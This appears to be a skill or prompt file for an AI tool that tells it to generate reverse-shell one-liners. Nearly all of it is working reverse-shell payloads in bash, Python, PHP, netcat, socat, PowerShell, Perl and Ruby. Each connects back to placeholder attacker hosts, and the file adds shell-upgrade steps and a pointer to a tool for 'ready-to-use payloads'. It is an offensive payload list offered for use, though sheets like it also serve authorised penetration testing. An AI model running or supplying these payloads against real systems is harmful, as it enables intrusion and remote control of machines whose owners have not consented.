---
name: cheatsheet-reverse-shells
description: Reverse shell one-liners for bash, python, php, nc, powershell, perl, ruby, socat, and more
---

# Reverse Shell Cheatsheet

Generate reverse shell one-liners for the specified language and connection details. If no IP/port specified, use placeholders.

## Bash
```bash
bash -i >& /dev/tcp/LHOST/LPORT 0>&1
```

## Python
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("bash")'
```

## PHP
```php
php -r '$sock=fsockopen("LHOST",LPORT);exec("bash <&3 >&3 2>&3");'
```

## Netcat
```bash
nc -e /bin/bash LHOST LPORT
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc LHOST LPORT >/tmp/f
```

## Socat
```bash
# Attacker listener:
socat file:`tty`,raw,echo=0 tcp-listen:LPORT
# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT
```

## PowerShell
```powershell
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sendbyte,0,$sendbyte.Length);$s.Flush()};$c.Close()"
```

## Perl
```perl
perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("bash -i");};'
```

## Ruby
```ruby
ruby -rsocket -e'f=TCPSocket.open("LHOST",LPORT).to_i;exec sprintf("bash -i <&%d >&%d 2>&%d",f,f,f)'
```

## Upgrading a Shell
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Then press Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Replace LHOST with attacker IP and LPORT with attacker port. Use the `reverse_shell_gen` tool for auto-generated, ready-to-use payloads.
